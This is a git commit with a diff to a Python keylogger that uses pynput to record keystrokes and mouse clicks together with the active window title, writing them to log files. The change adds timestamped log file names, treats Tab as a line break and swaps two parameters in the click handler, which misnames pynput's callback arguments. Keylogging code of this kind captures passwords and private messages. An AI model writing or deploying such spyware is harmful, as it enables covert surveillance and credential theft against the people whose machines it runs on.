b0ccc91f6107f5bdda777e3a022e8060f377d69c
anas lhichou <hichouanas@gmail.com>
2021-06-24 23:04:20 +0100

    dynamic log files name

--- keylogger.py
+++ keylogger.py
@@ -2,16 +2,19 @@ import pygetwindow as gw
 from pynput import keyboard
 from pynput.mouse import Listener
 import logging
+from datetime import datetime
 
 win = None
 clicked = False
 line=''
-logging.basicConfig(filename='example.log', encoding='utf-8',format='%(asctime)s %(message)s',datefmt='%m/%d/%Y %I:%M:%S %p')
+now = datetime.now()
+dt_string = now.strftime("%d-%m-%Y_%H-%M-%S")
+logging.basicConfig(filename=f'{dt_string}.log', encoding='utf-8',format='%(asctime)s | %(message)s',datefmt='%m/%d/%Y %I:%M:%S %p')
 def check_input_change(key):
     global win
     global clicked
     global line
-    if win != gw.getActiveWindow().title or clicked or str(key) == 'Key.enter':
+    if win != gw.getActiveWindow().title or clicked or str(key) == 'Key.enter' or str(key) == 'Key.tab':
         clicked = False
         win = gw.getActiveWindow().title
         print('\n')
@@ -35,7 +38,7 @@ def on_press(key):
         exit()
 
 
-def on_click(x, y, button, pressed):
+def on_click(x,y,pressed,button):
     global clicked
     clicked = True
 
